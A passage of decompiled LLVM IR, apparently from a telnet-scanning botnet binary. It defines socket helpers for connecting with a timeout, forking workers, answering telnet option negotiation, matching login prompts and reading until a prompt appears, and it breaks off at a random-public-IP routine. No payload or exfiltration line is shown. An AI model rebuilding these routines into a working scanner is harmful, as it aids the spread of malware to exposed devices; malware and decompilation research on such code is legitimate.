  %v5_8049540 = add i32 %v2_804953d, %tmp5
  %v1_8049543 = inttoptr i32 %v5_8049540 to i32*
  %v2_8049543 = load i32, i32* %v1_8049543, align 4
  store i32 %v2_8049543, i32* @eax, align 4
  %v3_804954c = call i32 @strcasestr(i8* %v2_804954c, i32 %v2_8049543)
  %v1_8049554 = icmp eq i32 %v3_804954c, 0
  br i1 %v1_8049554, label %dec_label_pc_8049561, label %dec_label_pc_8049573

dec_label_pc_8049561:                             ; preds = %dec_label_pc_804953a
  %v4_8049561 = add nuw nsw i32 %storemerge117, 1
  %v5_804956a = icmp slt i32 %v4_8049561, %v4_804951f
  br i1 %v5_804956a, label %dec_label_pc_804953a, label %dec_label_pc_8049573

dec_label_pc_8049573:                             ; preds = %dec_label_pc_804953a, %dec_label_pc_8049561, %dec_label_pc_8049564.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049564.preheader ], [ 0, %dec_label_pc_8049561 ], [ 1, %dec_label_pc_804953a ]
  %v2_8049576 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049576, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804951f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049573, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804953a, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_804957b = load i32, i32* @edi, align 4
  %v3_804958c = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049597 = or i32 %v3_804958c, 2048
  %v3_80495a9 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049597)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80495ba = urem i32 %arg3, 65536
  %v1_80495c3 = call i32 @htons(i32 %v1_80495ba)
  store i32 %arg2, i32* @edx, align 4
  %v3_80495dd = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80495e5 = icmp eq i32 %v3_80495dd, 0
  br i1 %v1_80495e5, label %dec_label_pc_80495f8, label %dec_label_pc_80495e9

dec_label_pc_80495e9:                             ; preds = %entry
  br label %dec_label_pc_8049735

dec_label_pc_80495f8:                             ; preds = %entry
  %v2_80495d5 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049617 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80495d5, i32 16)
  %v5_8049622 = icmp slt i32 %v3_8049617, 0
  %v1_8049626 = icmp eq i1 %v5_8049622, false
  br i1 %v1_8049626, label %dec_label_pc_80496fc, label %dec_label_pc_804962c

dec_label_pc_804962c:                             ; preds = %dec_label_pc_80495f8
  %v1_804962c = call i32 @__errno_location(i32 %v3_8049617)
  %v1_8049631 = inttoptr i32 %v1_804962c to i32*
  %v2_8049631 = load i32, i32* %v1_8049631, align 4
  %v9_8049633 = icmp eq i32 %v2_8049631, 115
  %v1_8049636 = icmp eq i1 %v9_8049633, false
  br i1 %v1_8049636, label %dec_label_pc_80496f0, label %dec_label_pc_804963c

dec_label_pc_804963c:                             ; preds = %dec_label_pc_804962c
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049659 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049659, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049660 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804966d = udiv i32 %arg1, 32
  %v1_8049673 = urem i32 %arg1, 32
  %v0_8049676 = load i32, i32* @ebp, align 4
  %v2_8049676 = mul nuw nsw i32 %v2_804966d, 4
  %v3_8049676 = add nsw i32 %v2_8049676, -164
  %v4_8049676 = add i32 %v3_8049676, %v0_8049676
  %v5_8049676 = inttoptr i32 %v4_8049676 to i32*
  %v6_8049676 = load i32, i32* %v5_8049676, align 4
  %v9_8049676 = shl i32 1, %v1_8049673
  %v12_8049676 = or i32 %v6_8049676, %v9_8049676
  store i32 %v12_8049676, i32* %v5_8049676, align 4
  %v1_8049681 = add i32 %arg1, 1
  %v2_8049685 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049698 = call i32 @__libc_select(i32 %v1_8049681, i32 0, i32 %v2_8049659, i32 0, i32 %v2_8049685)
  %tmp33 = icmp slt i32 %v5_8049698, 1
  br i1 %tmp33, label %dec_label_pc_80496e4, label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_804963c
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80496b1 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80496b8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80496c6 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80496b8, i32 %v2_80496b1)
  %v3_80496ce = load i32, i32* %stack_var_-184, align 4
  %v1_80496d4 = icmp eq i32 %v3_80496ce, 0
  br i1 %v1_80496d4, label %dec_label_pc_80496fc, label %dec_label_pc_80496d8

dec_label_pc_80496d8:                             ; preds = %dec_label_pc_80496a4
  br label %dec_label_pc_8049735

dec_label_pc_80496e4:                             ; preds = %dec_label_pc_804963c
  br label %dec_label_pc_8049735

dec_label_pc_80496f0:                             ; preds = %dec_label_pc_804962c
  br label %dec_label_pc_8049735

dec_label_pc_80496fc:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80495f8
  %v3_8049706 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049711 = and i32 %v3_8049706, -2049
  %v3_8049723 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049711)
  br label %dec_label_pc_8049735

dec_label_pc_8049735:                             ; preds = %dec_label_pc_80496f0, %dec_label_pc_80496e4, %dec_label_pc_80496d8, %dec_label_pc_80495e9, %dec_label_pc_80496fc
  %v3_8049735 = phi i32 [ 0, %dec_label_pc_80496f0 ], [ 0, %dec_label_pc_80496e4 ], [ 0, %dec_label_pc_80496d8 ], [ 0, %dec_label_pc_80495e9 ], [ 1, %dec_label_pc_80496fc ]
  store i32 %v0_804957b, i32* @edi, align 4
  ret i32 %v3_8049735

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049735, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049743 = load i32, i32* @ebx, align 4
  store i32 %v0_8049743, i32* %stack_var_-8, align 4
  %v1_8049747 = call i32 @__libc_fork(i32 %v0_8049743)
  %v4_804974f = icmp eq i32 %v1_8049747, 0
  %v1_8049753 = icmp eq i1 %v4_804974f, false
  br i1 %v1_8049753, label %dec_label_pc_8049760, label %dec_label_pc_8049755

dec_label_pc_8049755:                             ; preds = %entry
  br label %dec_label_pc_8049844

dec_label_pc_8049760:                             ; preds = %entry
  %v0_8049760 = load i32, i32* @global_var_8061588.34, align 8
  %v0_8049765 = load i32, i32* @global_var_806158c.35, align 4
  %v1_804976b = add i32 %v0_8049760, 1
  %v5_804976b = icmp eq i32 %v0_8049760, -1
  %v2_804976e = zext i1 %v5_804976b to i32
  %v3_804976e = add i32 %v2_804976e, %v0_8049765
  store i32 %v1_804976b, i32* @global_var_8061588.34, align 8
  store i32 %v3_804976e, i32* @global_var_806158c.35, align 4
  %v2_804978b = mul i32 %v1_804976b, 4
  %v1_804978e = add i32 %v2_804978b, 4
  %v1_8049795 = call i32 @malloc(i32 %v1_804978e)
  br label %dec_label_pc_80497cb

dec_label_pc_80497a9:                             ; preds = %dec_label_pc_80497cb, %dec_label_pc_80497fc
  %v2_80497ac = mul i32 %storemerge1, 4
  %v5_80497b1 = add i32 %v2_80497ac, %v1_8049795
  %v0_80497bc = load i32, i32* @global_var_8067814.36, align 4
  %v2_80497c1 = add i32 %v0_80497bc, %v2_80497ac
  %v1_80497c4 = inttoptr i32 %v2_80497c1 to i32*
  %v2_80497c4 = load i32, i32* %v1_80497c4, align 4
  %v2_80497c6 = inttoptr i32 %v5_80497b1 to i32*
  store i32 %v2_80497c4, i32* %v2_80497c6, align 4
  %v4_80497c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_80497cb

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_80497a9
  %storemerge1 = phi i32 [ %v4_80497c8, %dec_label_pc_80497a9 ], [ 0, %dec_label_pc_8049760 ]
  %v0_80497d9 = load i32, i32* @global_var_8061588.34, align 8
  %v0_80497de = load i32, i32* @global_var_806158c.35, align 4
  %v4_80497e8 = icmp ne i32 %v0_80497d9, 0
  %v2_80497eb = zext i1 %v4_80497e8 to i32
  %v3_80497eb = add i32 %v0_80497de, -1
  %v4_80497eb = add i32 %v3_80497eb, %v2_80497eb
  store i32 %v4_80497eb, i32* @ebx, align 4
  %v10_80497f7 = icmp eq i32 %v4_80497eb, 0
  br i1 %v10_80497f7, label %dec_label_pc_80497fc, label %dec_label_pc_80497a9

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497cb
  %v1_80497e8 = add i32 %v0_80497d9, -1
  %v10_8049807 = icmp ult i32 %storemerge1, %v1_80497e8
  br i1 %v10_8049807, label %dec_label_pc_80497a9, label %dec_label_pc_804980c

dec_label_pc_804980c:                             ; preds = %dec_label_pc_80497fc
  %v2_8049817 = mul i32 %v0_80497d9, 4
  %v5_804981a = add i32 %v1_8049795, -4
  %v1_804981d = add i32 %v5_804981a, %v2_8049817
  store i32 %v1_804981d, i32* @edx, align 4
  %v2_8049823 = inttoptr i32 %v1_804981d to i32*
  store i32 %v1_8049747, i32* %v2_8049823, align 4
  %v0_8049825 = load i32, i32* @global_var_8067814.36, align 4
  %v1_804982e = call i32 @free(i32 %v0_8049825)
  store i32 %v1_8049795, i32* @global_var_8067814.36, align 4
  store i32 %v1_8049747, i32* @ecx, align 4
  br label %dec_label_pc_8049844

dec_label_pc_8049844:                             ; preds = %dec_label_pc_8049755, %dec_label_pc_804980c
  %v3_8049847 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049847, i32* @ebx, align 4
  ret i32 %v1_8049747

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80497ac, { 1, 0 }
  uselistorder i32 %v1_8049795, { 2, 0, 1 }
  uselistorder i32 %v0_8049760, { 1, 0 }
  uselistorder label %dec_label_pc_8049844, { 1, 0 }
  uselistorder label %dec_label_pc_80497cb, { 1, 0 }
  uselistorder label %dec_label_pc_80497a9, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804984c = load i32, i32* @ebp, align 4
  store i32 %v0_804984c, i32* %stack_var_-4, align 4
  %v1_8049855 = add i32 %arg2, 1
  %v1_8049856 = inttoptr i32 %v1_8049855 to i8*
  %v2_8049856 = load i8, i8* %v1_8049856, align 1
  %v5_8049856 = and i32 %v1_8049855, -256
  %v9_8049862 = icmp ult i8 %v2_8049856, -5
  br i1 %v9_8049862, label %dec_label_pc_8049942, label %dec_label_pc_804986f

dec_label_pc_804986f:                             ; preds = %entry
  %v7_8049876 = icmp eq i8 %v2_8049856, -1
  br i1 %v7_8049876, label %dec_label_pc_8049878, label %dec_label_pc_8049892

dec_label_pc_8049878:                             ; preds = %dec_label_pc_804986f
  br label %dec_label_pc_8049942

dec_label_pc_8049892:                             ; preds = %dec_label_pc_804986f
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_804989d = ptrtoint i32* %stack_var_-5 to i32
  %v4_80498a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v2_80498b0 = load i8, i8* %v1_8049856, align 1
  %v11_80498b2 = icmp eq i8 %v2_80498b0, -4
  %v1_80498b4 = icmp eq i1 %v11_80498b2, false
  br i1 %v1_80498b4, label %dec_label_pc_80498bc, label %dec_label_pc_80498b6

dec_label_pc_80498b6:                             ; preds = %dec_label_pc_8049892
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498bc:                             ; preds = %dec_label_pc_8049892
  %v2_80498c0 = load i8, i8* %v1_8049856, align 1
  %v11_80498c2 = icmp eq i8 %v2_80498c0, -2
  %v1_80498c4 = icmp eq i1 %v11_80498c2, false
  br i1 %v1_80498c4, label %dec_label_pc_80498cc, label %dec_label_pc_80498c6

dec_label_pc_80498c6:                             ; preds = %dec_label_pc_80498bc
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498cc:                             ; preds = %dec_label_pc_80498bc
  %v2_80498d0 = load i8, i8* %v1_8049856, align 1
  %v10_80498d2 = icmp eq i8 %v2_80498d0, 3
  %v1_80498d4 = icmp eq i1 %v10_80498d2, false
  %v11_80498f8 = icmp eq i8 %v2_80498d0, -3
  %v1_80498fa = icmp eq i1 %v11_80498f8, false
  br i1 %v1_80498d4, label %dec_label_pc_80498f2, label %dec_label_pc_80498d6

dec_label_pc_80498d6:                             ; preds = %dec_label_pc_80498cc
  %. = select i1 %v1_80498fa, i32 253, i32 251
  %v7_80498ea = or i32 %., %v5_8049856
  store i32 %v7_80498ea, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_80498f2:                             ; preds = %dec_label_pc_80498cc
  %.2 = select i1 %v1_80498fa, i32 254, i32 252
  %v5_8049906 = load i32, i32* @edx, align 4
  %v6_8049906 = and i32 %v5_8049906, -256
  %v7_8049906 = or i32 %v6_8049906, %.2
  store i32 %v7_8049906, i32* %stack_var_-5, align 4
  br label %dec_label_pc_804990c

dec_label_pc_804990c:                             ; preds = %dec_label_pc_80498d6, %dec_label_pc_80498c6, %dec_label_pc_80498b6, %dec_label_pc_80498f2
  %v4_804991a = call i32 @__libc_send(i32 %arg1, i32 %v2_804989d, i32 1, i32 16384)
  %v1_8049925 = add i32 %arg2, 2
  %v4_8049933 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049925, i32 1, i32 16384)
  %v2_8049945.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049942

dec_label_pc_8049942:                             ; preds = %dec_label_pc_8049878, %dec_label_pc_804990c, %entry
  %v2_8049945 = phi i32 [ %v0_804984c, %dec_label_pc_8049878 ], [ %v2_8049945.pre, %dec_label_pc_804990c ], [ %v0_804984c, %entry ]
  store i32 %v2_8049945, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049942, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804990c, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049955 = ptrtoint i8* %arg1 to i32
  %v3_8049966 = call i32 @_strlen(i8* %arg1)
  %v4_8049966 = mul i32 %v3_8049966, -1
  %v1_804996c = sub i32 0, %v4_8049966
  %v6_8049993 = sub i32 %v4_8049955, %v4_8049966
  br label %dec_label_pc_8049a15

dec_label_pc_8049983:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_80499bc, %dec_label_pc_80499a5, %dec_label_pc_804998e
  %v4_8049983 = add nsw i32 %stack_var_-12.025, 1
  %v7_804998c = icmp slt i32 %v4_8049983, %v1_804996c
  br i1 %v7_804998c, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge: ; preds = %dec_label_pc_8049983, %dec_label_pc_8049986.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ], [ %v4_8049983, %dec_label_pc_8049983 ]
  %.pre = sub i32 %v6_8049993, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80499ea

dec_label_pc_804998e:                             ; preds = %dec_label_pc_8049986.preheader, %dec_label_pc_8049983
  %stack_var_-12.025 = phi i32 [ %v4_8049983, %dec_label_pc_8049983 ], [ %stack_var_-12.1, %dec_label_pc_8049986.preheader ]
  %v2_804999b = sub i32 %v6_8049993, %stack_var_-12.025
  %v1_804999f = inttoptr i32 %v2_804999b to i8*
  %v2_804999f = load i8, i8* %v1_804999f, align 1
  %v4_80499a1 = icmp eq i8 %v2_804999f, 0
  br i1 %v4_80499a1, label %dec_label_pc_8049983, label %dec_label_pc_80499a5

dec_label_pc_80499a5:                             ; preds = %dec_label_pc_804998e
  %v2_80499b6 = load i8, i8* %v1_804999f, align 1
  %v7_80499b8 = icmp eq i8 %v2_80499b6, 32
  br i1 %v7_80499b8, label %dec_label_pc_8049983, label %dec_label_pc_80499bc

dec_label_pc_80499bc:                             ; preds = %dec_label_pc_80499a5
  %v2_80499cd = load i8, i8* %v1_804999f, align 1
  %v10_80499cf = icmp eq i8 %v2_80499cd, 13
  br i1 %v10_80499cf, label %dec_label_pc_8049983, label %dec_label_pc_80499d3

dec_label_pc_80499d3:                             ; preds = %dec_label_pc_80499bc
  %v2_80499e4 = load i8, i8* %v1_804999f, align 1
  %v10_80499e6 = icmp eq i8 %v2_80499e4, 10
  br i1 %v10_80499e6, label %dec_label_pc_8049983, label %dec_label_pc_80499ea

dec_label_pc_80499ea:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %stack_var_-12.025, %dec_label_pc_80499d3 ]
  %v1_80499fb.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge ], [ %v1_804999f, %dec_label_pc_80499d3 ]
  %v2_80499fb = load i8, i8* %v1_80499fb.pre-phi, align 1
  %v6_8049a00 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_805715c.37 to i32)
  %v1_8049a03 = inttoptr i32 %v6_8049a00 to i8*
  %v2_8049a03 = load i8, i8* %v1_8049a03, align 1
  %v15_8049a05 = icmp eq i8 %v2_80499fb, %v2_8049a03
  %v1_8049a07 = icmp eq i1 %v15_8049a05, false
  br i1 %v1_8049a07, label %dec_label_pc_8049a12, label %dec_label_pc_8049a3f

dec_label_pc_8049a12:                             ; preds = %dec_label_pc_80499ea
  %v4_8049a12 = add i32 %storemerge2, 1
  br label %dec_label_pc_8049a15

dec_label_pc_8049a15:                             ; preds = %entry, %dec_label_pc_8049a12
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_8049a12 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_8049a12, %dec_label_pc_8049a12 ]
  %v3_8049a29 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805715c.37, i32 0, i32 0))
  %v7_8049a30 = icmp ult i32 %storemerge2, %v3_8049a29
  br i1 %v7_8049a30, label %dec_label_pc_8049986.preheader, label %dec_label_pc_8049a3f

dec_label_pc_8049986.preheader:                   ; preds = %dec_label_pc_8049a15
  %v7_804998c24 = icmp slt i32 %stack_var_-12.1, %v1_804996c
  br i1 %v7_804998c24, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049a3f:                             ; preds = %dec_label_pc_8049a15, %dec_label_pc_80499ea
  %storemerge = phi i32 [ 1, %dec_label_pc_80499ea ], [ 0, %dec_label_pc_8049a15 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049993, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805715c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a15, { 1, 0 }
  uselistorder label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049a8e = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049aa8 = urem i32 %arg1, 32
  %v9_8049aab = shl i32 1, %v1_8049aa8
  %v1_8049ab6 = add i32 %arg1, 1
  %v2_8049aba = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049b89 = inttoptr i32 %arg2 to i8*
  %v4_8049b95 = icmp eq i32 %arg3, 0
  %v1_8049bb640 = add i32 %arg8, 2
  %v5_8049bbc43 = icmp slt i32 %v1_8049bb640, %arg7
  br i1 %v5_8049bbc43, label %dec_label_pc_8049bbe.lr.ph, label %dec_label_pc_8049bec

dec_label_pc_8049bbe.lr.ph:                       ; preds = %entry
  %v2_8049aa2 = udiv i32 %arg1, 32
  %v2_8049aab = mul nuw nsw i32 %v2_8049aa2, 4
  %v3_8049aab = add nsw i32 %v2_8049aab, -156
  %v5_8049ae0 = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_8049bbe

dec_label_pc_8049a84:                             ; preds = %dec_label_pc_8049bcc, %dec_label_pc_8049bbe
  store i32 %v2_8049a8e, i32* @edi, align 4
  %v5_8049a95 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8049aab = load i32, i32* @ebp, align 4
  %v4_8049aab = add i32 %v3_8049aab, %v0_8049aab
  %v5_8049aab = inttoptr i32 %v4_8049aab to i32*
  %v6_8049aab = load i32, i32* %v5_8049aab, align 4
  %v12_8049aab = or i32 %v6_8049aab, %v9_8049aab
  store i32 %v12_8049aab, i32* %v5_8049aab, align 4
  %v5_8049acd = call i32 @__libc_select(i32 %v1_8049ab6, i32 %v2_8049a8e, i32 0, i32 0, i32 %v2_8049aba)
  %tmp35 = icmp slt i32 %v5_8049acd, 1
  br i1 %tmp35, label %dec_label_pc_8049bec, label %dec_label_pc_8049add

dec_label_pc_8049add:                             ; preds = %dec_label_pc_8049a84
  %v6_8049ae0 = add i32 %stack_var_-32.044, %v5_8049ae0
  %v5_8049ae3 = inttoptr i32 %v6_8049ae0 to i8*
  %v5_8049af0 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049ae0, i32 1, i32 0)
  %v13_8049afb = icmp eq i32 %v5_8049af0, -1
  br i1 %v13_8049afb, label %dec_label_pc_8049b07, label %dec_label_pc_8049b01

dec_label_pc_8049b01:                             ; preds = %dec_label_pc_8049add
  %v4_8049b01 = icmp eq i32 %v5_8049af0, 0
  %v1_8049b05 = icmp eq i1 %v4_8049b01, false
  br i1 %v1_8049b05, label %dec_label_pc_8049b16, label %dec_label_pc_8049b07

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049b01, %dec_label_pc_8049add
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b16:                             ; preds = %dec_label_pc_8049b01
  %v5_8049b19 = add i32 %v5_8049af0, %stack_var_-32.044
  %v2_8049b1f = load i8, i8* %v5_8049ae3, align 1
  %v11_8049b21 = icmp eq i8 %v2_8049b1f, -1
  %v1_8049b23 = icmp eq i1 %v11_8049b21, false
  br i1 %v1_8049b23, label %dec_label_pc_8049b80, label %dec_label_pc_8049b25

dec_label_pc_8049b25:                             ; preds = %dec_label_pc_8049b16
  %v1_8049b28 = add i32 %v6_8049ae0, 1
  %v5_8049b31 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049b28, i32 2, i32 0)
  %v13_8049b3c = icmp eq i32 %v5_8049b31, -1
  br i1 %v13_8049b3c, label %dec_label_pc_8049b48, label %dec_label_pc_8049b42

dec_label_pc_8049b42:                             ; preds = %dec_label_pc_8049b25
  %v4_8049b42 = icmp eq i32 %v5_8049b31, 0
  %v1_8049b46 = icmp eq i1 %v4_8049b42, false
  br i1 %v1_8049b46, label %dec_label_pc_8049b57, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b42, %dec_label_pc_8049b25
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b57:                             ; preds = %dec_label_pc_8049b42
  %v5_8049b5a = add i32 %v5_8049b31, %v5_8049b19
  %v3_8049b68 = call i32 @negotiate(i32 %arg1, i32 %v6_8049ae0, i32 3)
  %v1_8049b70 = icmp eq i32 %v3_8049b68, 0
  %v1_8049b72 = icmp eq i1 %v1_8049b70, false
  br i1 %v1_8049b72, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b74

dec_label_pc_8049bb3.backedge:                    ; preds = %dec_label_pc_8049b57, %dec_label_pc_8049b95, %dec_label_pc_8049b9b
  %stack_var_-32.0.be = phi i32 [ %v5_8049b19, %dec_label_pc_8049b95 ], [ %v5_8049b19, %dec_label_pc_8049b9b ], [ %v5_8049b5a, %dec_label_pc_8049b57 ]
  %v1_8049bb6 = add i32 %stack_var_-32.0.be, 2
  %v5_8049bbc = icmp slt i32 %v1_8049bb6, %arg7
  br i1 %v5_8049bbc, label %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, label %dec_label_pc_8049bec

dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge: ; preds = %dec_label_pc_8049bb3.backedge
  %v3_8049bbe.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049bbe

dec_label_pc_8049b74:                             ; preds = %dec_label_pc_8049b57
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b80:                             ; preds = %dec_label_pc_8049b16
  %v3_8049b89 = call i32 @strstr(i32 %v5_8049ae0, i8* %v2_8049b89)
  %v1_8049b91 = icmp eq i32 %v3_8049b89, 0
  %v1_8049b93 = icmp eq i1 %v1_8049b91, false
  br i1 %v1_8049b93, label %dec_label_pc_8049be0, label %dec_label_pc_8049b95

dec_label_pc_8049b95:                             ; preds = %dec_label_pc_8049b80
  br i1 %v4_8049b95, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b9b

dec_label_pc_8049b9b:                             ; preds = %dec_label_pc_8049b95
  %v3_8049b9e = call i32 @matchPrompt(i8* %arg6)
  %v1_8049ba6 = icmp eq i32 %v3_8049b9e, 0
  br i1 %v1_8049ba6, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049be0

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, %dec_label_pc_8049bbe.lr.ph
  %v3_8049bbe = phi i32 [ %arg4, %dec_label_pc_8049bbe.lr.ph ], [ %v3_8049bbe.pre, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049bbe.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %tmp36 = icmp slt i32 %v3_8049bbe, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8049a84, label %dec_label_pc_8049bcc

dec_label_pc_8049bcc:                             ; preds = %dec_label_pc_8049bbe
  br i1 %tmp39, label %dec_label_pc_8049a84, label %dec_label_pc_8049bec

dec_label_pc_8049be0:                             ; preds = %dec_label_pc_8049b9b, %dec_label_pc_8049b80
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bec:                             ; preds = %dec_label_pc_8049bb3.backedge, %dec_label_pc_8049bcc, %dec_label_pc_8049a84, %entry
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bf6:                             ; preds = %dec_label_pc_8049be0, %dec_label_pc_8049b74, %dec_label_pc_8049b48, %dec_label_pc_8049b07, %dec_label_pc_8049bec
  %v3_8049bf6 = phi i32 [ 1, %dec_label_pc_8049be0 ], [ 0, %dec_label_pc_8049b74 ], [ 0, %dec_label_pc_8049b48 ], [ 0, %dec_label_pc_8049b07 ], [ 0, %dec_label_pc_8049bec ]
  ret i32 %v3_8049bf6

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_8049b31, { 0, 2, 1 }
  uselistorder i32 %v5_8049af0, { 0, 2, 1 }
  uselistorder i32 %v5_8049ae0, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049bf6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049bec, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bb3.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
